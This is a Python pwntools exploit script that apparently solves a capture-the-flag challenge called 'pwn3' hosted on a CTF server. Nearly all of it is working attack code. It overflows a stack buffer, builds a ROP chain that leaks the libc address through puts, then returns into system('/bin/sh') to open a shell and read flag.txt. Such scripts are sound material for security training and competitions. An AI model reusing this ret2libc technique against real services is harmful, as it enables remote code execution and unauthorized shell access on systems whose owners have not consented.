#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challs.n00bzunit3d.xyz --port 42450 pwn3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pwn3')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challs.n00bzunit3d.xyz'
port = int(args.PORT or 42450)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)


io = start()

# gadgets in the executable
pop_rdi = 0x401232
ret = 0x40101a

# leak libc base + return to main
rop1 = p64(pop_rdi)
rop1 += p64(exe.got['puts'])
rop1 += p64(exe.plt['puts'])
rop1 += p64(exe.symbols['main'])

# return to system
io.sendline(b'a'*40 + rop1)
io.recvuntil('}\n')
libc = exe.libc
libc.address = int.from_bytes(io.recvline()[:-1],'little') - libc.symbols['puts']
print(f"libc : 0x{libc.address:x}")

rop2 = p64(pop_rdi)
rop2 += p64(next(libc.search(b'/bin/sh\x00')))
rop2 += p64(ret)
rop2 += p64(libc.symbols['system'])
io.sendline(b'a'*40 + rop2)

io.sendline("cat flag.txt")

io.interactive()

